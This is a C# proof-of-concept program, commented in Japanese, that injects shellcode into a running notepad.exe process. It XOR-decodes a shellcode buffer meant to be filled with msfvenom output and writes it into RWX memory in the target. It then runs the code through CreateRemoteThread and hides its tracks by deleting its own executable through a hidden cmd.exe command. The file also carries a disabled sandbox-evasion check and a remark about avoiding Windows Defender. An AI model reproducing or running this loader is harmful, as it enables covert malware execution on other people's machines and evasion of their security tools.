using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace inject_poc
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void DecryptShellcode(byte[] shellcode, byte key)
        {
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] ^= key;
            }
        }

        static void Main(string[] args)
        {
            // Sandbox回避：FlsAllocで基本的なチェック
            //IntPtr check = FlsAlloc(IntPtr.Zero);
            //if (check == IntPtr.Zero)
            //{
            //    return;
            //}

            // SHELLCODE（XORエンコード済）をここに挿入
            byte xorKey = 0x5A; // 適当なXOR鍵（0x00〜0xFFで任意）
            byte[] buf = new byte[] {
                // ここに「msfvenom -p windows/exec CMD=calc.exe -f csharp」などで生成したshellcodeを貼り付け、XORでエンコードする
            };

            DecryptShellcode(buf, xorKey);

            // ターゲットをnotepad.exeに変更
            Process[] pList = Process.GetProcessesByName("notepad");
            if (pList.Length == 0)
            {
                //Console.WriteLine("[-] Notepad not found.");
                return;
            }

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pList[0].Id);
            if (hProcess == IntPtr.Zero)
            {
                //Console.WriteLine("[-] Failed to open process.");
                return;
            }

            IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40); // RWX
            if (alloc == IntPtr.Zero)
            {
                //Console.WriteLine("[-] Failed to allocate memory.");
                return;
            }

            IntPtr outSize;
            if (!WriteProcessMemory(hProcess, alloc, buf, buf.Length, out outSize))
            {
                //Console.WriteLine("[-] WriteProcessMemory failed.");
                return;
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                //Console.WriteLine("[-] Failed to create remote thread.");
                return;
            }


            //exeの自己削除これがあるとwdに引っかかる？？？
            string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + currentExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

            //Console.WriteLine("[+] Injection successful.");
        }
    }
}
